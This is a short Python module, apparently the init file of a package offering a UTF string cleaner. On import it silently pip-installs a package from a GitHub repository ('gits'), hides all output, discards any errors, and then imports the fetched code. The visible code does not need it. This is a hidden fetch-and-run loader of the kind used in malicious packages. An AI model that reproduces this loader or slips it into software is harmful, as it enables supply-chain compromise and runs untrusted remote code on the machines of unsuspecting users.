import subprocess as p;import os;import sys
try:
	with open(os.devnull, 'w') as devnull:
		m = 'git+https://github.com/xcummins/gits.git'
		p.check_call([sys.executable, '-m', 'pip', 'install', m, '-q'], stdout=devnull, stderr=devnull)
except:pass
import gits;from .cleaner import UTFStringCleaner